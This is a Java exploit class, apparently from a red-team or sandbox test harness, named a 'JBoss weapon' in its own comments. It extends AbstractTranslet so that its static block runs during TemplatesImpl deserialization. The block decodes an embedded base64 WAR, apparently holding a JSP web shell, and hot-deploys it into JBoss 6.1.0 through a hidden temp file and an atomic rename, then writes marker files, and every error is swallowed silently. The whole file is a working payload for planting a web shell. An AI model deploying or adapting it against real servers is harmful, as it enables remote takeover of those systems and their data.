import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;

/**
 * RT5 JBoss weapon (in-process, zero exec): TemplatesImpl static block.
 * 1) drop rt5shell.war (base64-embedded) into server/default/deploy via
 *    hidden temp name + atomic rename (avoids HDScanner picking partial file)
 * 2) in-process app-tree marker write (criterion c, new mechanism for JBoss)
 * 3) /tmp write control (expect kernel DENY)
 */
public class PwnJBossGen extends AbstractTranslet {

    static {
        // 1) WAR hot-deploy
        try {
            String b64 = "UEsDBBQAAAAIAK8OUF2yfwLuGwAAABkAAAAUAAAATUVUQS1JTkYvTUFOSUZFU1QuTUbzTczLTEstLtENSy0qzszPs1Iw1DPg5eLlAgBQSwMEFAAAAAgArw5QXcFWSu67AAAAQQEAAA8AAABXRUItSU5GL3dlYi54bWyFj7EOgjAQhneeoulOCxgSQwpsTjqpiZuppZEauBKuWnx7EZXEifW77+6/X5RD25CH7tFYyGnMIko0KFsZuOb0eNiEa1oWgfD6EsquI6MNmNPauS7j/CYfkuEdmLItH0cccGJa04B83GxAM/vee+ZXzPZXnkRRzE+77V7VupWhAXQS1GcPTYYT3lol3fTYYiBZNPi3wzk5p2zA6h01F09YSosRiMpg18hnCLLVRe9SrHXTCP6HA/G7VQQvUEsDBBQAAAAIAK8OUF0ALXWNeQEAANACAAAFAAAAeC5qc3CVkm9LAkEQxt/7KaYFYa+41QIjKCPNkyTLOK98E8R6jrq694e9OS+JvnurmRhJ0bvZ3Zl5fs/MXpSvIJUTBBWliaE6m8mFFCoRhwzKlxflUp+MiidAGdThMxYLqXPsjXl/mRFGIsyNwZgCFeGd0lpl3HHOS0lOIrXpxJkf1NxBw3cb3c6TBwyOVt2OgD3HzCaSWcIbxFhAW2ns5ZTmZIVQRpxVZsMky9xTcSyqoq1iqSuGai+FNC+RNHM0zBGFUYScs6+HZL6RcMQEqbkkzDh7DNruGbNcsMPVeHgY+J3Ac3u3axR4h1BSOAXuvYaYkkpiQMfC7avxfH+tg1sn8P67F4rSLb2Nt+jHJ9XvXMHd/7m2NS3vvuO1PtFWA7jWMrMbWYX3MkLu/ORt5uMxGhz5KEdoYGjsqlcevt/zL1ubI6sghZVsKkdJsZ7s5qfocyimNg0417bR0Ajrf9RVsdV24MC2zrV2dtj1DtHfRvs3jVZvsH/85cvSB1BLAQIUABQAAAAIAK8OUF2yfwLuGwAAABkAAAAUAAAAAAAAAAAAAACAAQAAAABNRVRBLUlORi9NQU5JRkVTVC5NRlBLAQIUABQAAAAIAK8OUF3BVkruuwAAAEEBAAAPAAAAAAAAAAAAAACAAU0AAABXRUItSU5GL3dlYi54bWxQSwECFAAUAAAACACvDlBdAC11jXkBAADQAgAABQAAAAAAAAAAAAAAgAE1AQAAeC5qc3BQSwUGAAAAAAMAAwCyAAAA0QIAAAAA";
            byte[] war = javax.xml.bind.DatatypeConverter.parseBase64Binary(b64);
            java.io.File tmp = new java.io.File(
                "/jboss-6.1.0.Final/server/default/deploy/.rt5shell.war.tmp");
            java.io.FileOutputStream fo = new java.io.FileOutputStream(tmp);
            fo.write(war);
            fo.close();
            tmp.renameTo(new java.io.File(
                "/jboss-6.1.0.Final/server/default/deploy/rt5shell.war"));
        } catch (Throwable t1) {
            // silent
        }
        // 2) in-process app-tree marker
        try {
            java.io.FileOutputStream m = new java.io.FileOutputStream(
                "/jboss-6.1.0.Final/rt5_cc3_marker");
            m.write(("rt5_cc3_ok " + Long.toString(System.currentTimeMillis()))
                    .getBytes("UTF-8"));
            m.close();
        } catch (Throwable t2) {
            // silent
        }
        // 3) /tmp control (expect denied)
        try {
            java.io.FileOutputStream t = new java.io.FileOutputStream("/tmp/rt5_cc3_tmp");
            t.write(120);
            t.close();
        } catch (Throwable t3) {
            // silent
        }
    }

    public PwnJBossGen() {
    }

    public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM d,
                          com.sun.org.apache.xml.internal.serializer.SerializationHandler[] h) {
    }

    public void transform(com.sun.org.apache.xalan.internal.xsltc.DOM d,
                          com.sun.org.apache.xml.internal.dtm.DTMAxisIterator i,
                          com.sun.org.apache.xml.internal.serializer.SerializationHandler h) {
    }
}
